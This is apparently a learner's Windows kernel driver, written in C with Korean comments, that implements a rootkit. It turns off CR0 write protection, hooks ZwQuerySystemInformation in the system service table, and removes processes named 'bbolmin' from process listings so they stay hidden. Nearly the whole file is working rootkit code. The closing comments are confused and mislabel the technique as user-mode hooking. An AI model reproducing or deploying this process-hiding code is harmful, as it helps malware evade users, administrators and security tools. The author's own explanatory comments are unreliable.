#include "hook.h"


// CR0 레지스터에 대해서 메모리 보호를 무력화 하는 코드


//Write권한 주기
VOID Set_Write(VOID)
{
	__asm {
		push eax;
		mov eax, cr0;
		and eax, WP_MASK;
		mov cr0, eax;
		pop eax;
	}
}

//Write권한 빼기
VOID Set_Read(VOID)
{
	__asm {
		push eax;
		mov eax, cr0;
		or eax, not WP_MASK;
		mov cr0, eax;
		pop eax;
	}
}


ZWQUERYSYSTEMINFORMATION OrgZwQuerySystemInformation = NULL;		//Original ZwQuerySystemInformation 함수 백업



																	// 새로운 ZwQuerySystemInformation 함수 정의
NTSTATUS
NewZwQuerySystemInformation(
	IN ULONG SystemInformationClass,
	IN PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG RetunLength
)
{
	NTSTATUS ntStatus;

	ntStatus = ((ZWQUERYSYSTEMINFORMATION)OrgZwQuerySystemInformation) (
		SystemInformationClass,
		SystemInformation,
		SystemInformationLength,
		RetunLength
		);


	if (NT_SUCCESS(ntStatus))
	{
		if (SystemInformationClass == 5) // 프로세스 리스트를 구하는 경우
		{
			struct _SYSTEM_PROCESSES *curr = (struct _SYSTEM_PROCESSES*) SystemInformation;
			struct _SYSTEM_PROCESSES *prev = NULL;

			while (curr)
			{
				if (curr->ProcessName.Buffer != NULL)
				{
					if (wcsstr(curr->ProcessName.Buffer, L"bbolmin") != NULL) // bbolmin으로 다시 바꿔
					{
						if (prev)	//첫번째가 아닌 경우
						{
							if (curr->NextEntryDelta)
								prev->NextEntryDelta += curr->NextEntryDelta;	//현재 프로세스 엔트리를 넘김
							else
								prev->NextEntryDelta = 0;						//마지막인 경우
						}
						else		//첫번째인 경우
						{
							if (curr->NextEntryDelta)								//다음 엔트리를 시작으로
								SystemInformation = (struct _SYSTEM_PROCESSES *) ((char *)curr + curr->NextEntryDelta);
							else
								SystemInformation = NULL;						//}존재하지 않음
						}

					}
					else
						prev = curr;											//hide한 엔트리의 경우에는 이전 엔트리를 수정하지 않아야함.

				}
				else
					prev = curr;

				if (curr->NextEntryDelta)
					curr = (struct _SYSTEM_PROCESSES *) ((char *)curr + curr->NextEntryDelta);
				else
					curr = NULL;
			}
		}
	}

	return ntStatus;
}



void SetHook()
{
	OrgZwQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION)(SYSTEM_SERVICE(ZwQuerySystemInformation));

	Set_Write();
	HOOK_SYSCALL(ZwQuerySystemInformation, NewZwQuerySystemInformation);
	DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "Set Hook Code !");
	Set_Read();
}

void UnHook()
{
	Set_Write();
	HOOK_SYSCALL(ZwQuerySystemInformation, OrgZwQuerySystemInformation);
	DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "UnHooked !");
	Set_Read();
}


extern "C"
//드라이버 언로드 루틴
VOID OnUnload(IN PDRIVER_OBJECT DriverObject)
{
	UNREFERENCED_PARAMETER(DriverObject);
	DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "[UnLoad]");
	//SSDT 후킹해제
	UnHook();
}

extern "C"
NTSTATUS DriverEntry(IN PDRIVER_OBJECT theDriverObject, IN PUNICODE_STRING theRegistryPath)
{
	UNREFERENCED_PARAMETER(theRegistryPath);
	theDriverObject->DriverUnload = OnUnload;

	DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "[Load]");
	//SSDT 후킹
	SetHook();

	return STATUS_SUCCESS;
}

// ssdt 후킹이라고 볼 수 없어.
// User Mode 단 후킹이라고 봐야해

// 프로세스정보를 구하는 함수 -> zwquerysysteminformation	[User] | [Kernel] -> ssdt -> ntquerysysteminformation

// 프로세스 정보를 구하는 함수 -> zwquerysysteminformation -> newzwquerysysteminformation -> OrgZwQuerySystemInformation [User] | [Kernel] -> ssdt -> ntquerysysteminformation


// 아씨 몰라 
